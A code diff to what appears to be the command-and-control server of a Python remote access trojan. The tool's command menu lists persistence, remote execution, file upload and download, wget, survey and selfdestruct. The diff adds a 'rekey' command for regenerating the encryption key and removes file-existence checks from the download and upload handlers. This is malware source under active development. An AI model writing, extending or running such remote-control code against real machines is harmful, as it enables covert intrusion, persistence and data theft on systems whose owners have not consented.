@@ -46,8 +46,8 @@ unzip <file>        - Unzip a file.
 upload <files>      - Upload files(s).
 wget <url>          - Download a file from the web.'''
 COMMANDS = [ 'client', 'clients', 'download', 'execute', 'help', 'kill',
-             'persistence', 'quit', 'scan', 'selfdestruct', 'survey', 'unzip',
-             'upload', 'wget' ]
+             'persistence', 'quit', 'rekey', 'scan', 'selfdestruct', 'survey',
+             'unzip', 'upload', 'wget' ]
 
 
 class Server(threading.Thread):
@@ -103,8 +103,7 @@ class ClientConnection(common.Client):
                 print 'Running selfdestruct...'
                 self.sendGCM(prompt)
                 self.conn.close()
-            else:
-                return
+            return
 
         # send prompt to client
         self.sendGCM(prompt)
@@ -118,18 +117,12 @@ class ClientConnection(common.Client):
         elif cmd == 'download':
             for fname in action.split():
                 fname = fname.strip()
-                if os.path.isfile(fname):
-                    print 'Error: File name already exists.'
-                    return
                 self.recvfile(fname)
 
         # send file
         elif cmd == 'upload':
             for fname in action.split():
                 fname = fname.strip()
-                if not os.path.isfile(fname):
-                    print 'Error: File not found.'
-                    return
                 self.sendfile(fname)
 
         # regenerate DH key
